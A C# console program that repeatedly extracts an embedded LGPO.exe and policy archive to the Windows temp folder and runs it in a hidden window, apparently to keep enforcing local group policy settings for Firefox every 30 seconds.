using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;

namespace Firefox_Management_Protocol
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    var paths = DownloadLGPO();
                    ZipFile.ExtractToDirectory(paths.Item2, "C:\\Windows\\Temp\\Firefox");
                    StartLGPO(paths);
                    File.Delete(paths.Item1);
                    File.Delete(paths.Item2);
                }
                catch { }
                Thread.Sleep(30000);
            }
        }
        private static void StartLGPO((string, string) paths)
        {
            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(paths.Item1);
            p.StartInfo.WorkingDirectory = @"C:\Windows\Temp";
            p.StartInfo.Arguments = "/g Firefox\\LGPO";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            p.WaitForExit();
        }

        private static (string, string) DownloadLGPO()
        {
            var exec = ExtractTemp("Firefox_Management_Protocol.LGPO.exe");
            var zip = ExtractTemp("Firefox_Management_Protocol.LGPO.zip");
            return (exec, zip);
        }

        private static string ExtractTemp(string res = "")
        {
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(res);
            if (stream == null) return null;
            string path = Path.GetTempFileName();
            using(BinaryReader r = new BinaryReader(stream))
            {
                byte[] data = new byte[stream.Length];
                r.Read(data, 0, data.Length);
                File.WriteAllBytes(path, data);
            }
            return path;
        }
    }
}
